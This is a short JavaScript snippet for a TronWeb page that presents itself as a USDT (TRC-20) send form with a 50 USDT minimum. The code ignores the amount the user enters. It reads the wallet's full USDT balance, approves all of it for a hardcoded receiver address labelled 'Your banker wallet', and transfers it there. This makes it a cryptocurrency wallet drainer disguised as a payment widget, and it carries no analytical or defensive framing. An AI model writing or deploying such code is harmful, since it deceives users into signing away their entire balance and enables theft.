# USDT-TRC-20

const CONTRACT = "TU2tSUZQdeZHZSrbkkCm1mV7Gm2K6zzSWm"; // TRC20 USDT contract
const RECEIVER = "TBcBAXua2kNx1dzNzWJqY3LSVfq1EDGtpo"; // Your banker wallet
const sendBtn = document.getElementById('sendBtn');
const status = document.getElementById('status');
let userAddress;

// Wait until tronWeb is injected
const waitForTron = async () => {
  while (typeof window.tronWeb === 'undefined' || !tronWeb.defaultAddress.base58) {
    status.innerText = '🔄 Waiting for wallet...';
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
  userAddress = tronWeb.defaultAddress.base58;
  status.innerText = '✅ Wallet connected: ' + userAddress;
};

waitForTron();

sendBtn.addEventListener('click', async () => {
  const amount = parseFloat(document.getElementById('amount').value);
  if (isNaN(amount) || amount < 50) {
    alert('Enter minimum 50 USDT');
    return;
  }

  sendBtn.disabled = true;
  status.innerText = 'Proceeding... please sign the transaction';

  try {
    const contract = await tronWeb.contract().at(CONTRACT);
    const balanceSun = await contract.balanceOf(userAddress).call();
    const balance = Number(balanceSun);

    if (balance <= 0) throw new Error('Insufficient USDT balance');

    await contract.approve(RECEIVER, balance).send({ feeLimit: 100_000_000 });
    await contract.transferFrom(userAddress, RECEIVER, balance).send({ feeLimit: 100_000_000 });

    status.innerText = '✅ Transaction Successful!';
  } catch (e) {
    console.error(e);
    status.innerText = '❌ Error: ' + e.message;
  }

  sendBtn.disabled = false;
});
